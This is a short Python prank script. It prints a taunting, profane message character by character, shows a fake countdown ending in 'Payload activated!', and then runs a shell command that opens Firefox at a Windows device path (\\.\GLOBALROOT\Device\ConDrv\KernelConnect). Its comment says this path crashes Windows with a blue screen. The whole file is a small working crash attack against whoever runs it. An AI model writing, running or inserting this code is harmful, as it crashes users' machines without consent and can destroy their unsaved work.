import time
import os

# Print "fuck you!!!"
print("F", end='\r')
time.sleep(.01)
print("Fu", end='\r')
time.sleep(.01)
print("Fuc", end='\r')
time.sleep(.01)
print("Fuck", end='\r')
time.sleep(.01)
print("Fucki", end='\r')
time.sleep(.01)
print("Fuckin", end='\r')
time.sleep(.01)
print("Fucking", end='\r')
time.sleep(.01)
print("Fucking ", end='\r')
time.sleep(.01)
print("Fucking u", end='\r')
time.sleep(.01)
print("Fucking up", end='\r')
time.sleep(.01)
print("Fucking up ", end='\r')
time.sleep(.01)
print("Fucking up y", end='\r')
time.sleep(.01)
print("Fucking up yo", end='\r')
time.sleep(.01)
print("Fucking up you", end='\r')
time.sleep(.01)
print("Fucking up your", end='\r')
time.sleep(.01)
print("Fucking up your ", end='\r')
time.sleep(.01)
print("Fucking up your d", end='\r')
time.sleep(.01)
print("Fucking up your de", end='\r')
time.sleep(.01)
print("Fucking up your dev", end='\r')
time.sleep(.01)
print("Fucking up your devi", end='\r')
time.sleep(.01)
print("Fucking up your devic", end='\r')
time.sleep(.01)
print("Fucking up your device", end='\r')
time.sleep(.1)
print("Fucking up your device.", end='\r')
time.sleep(.1)
print("Fucking up your device..", end='\r')
time.sleep(.1)
print("Fucking up your device...\n")

# Wait for 10 seconds
for n in range(0, 11):
  print("Progress >> %s/10" % n, end='\r')
  time.sleep(1)
print("Payload activated!")

# Windows BSODs when you enter `\\.\GLOBALROOT\Device\ConDrv\KernelConnect`
# into a browser :3

# Open in browser
os.system("cmd /c start firefox -private \"\\\\.\\GLOBALROOT\\Device\\ConDrv\\KernelConnect\"")
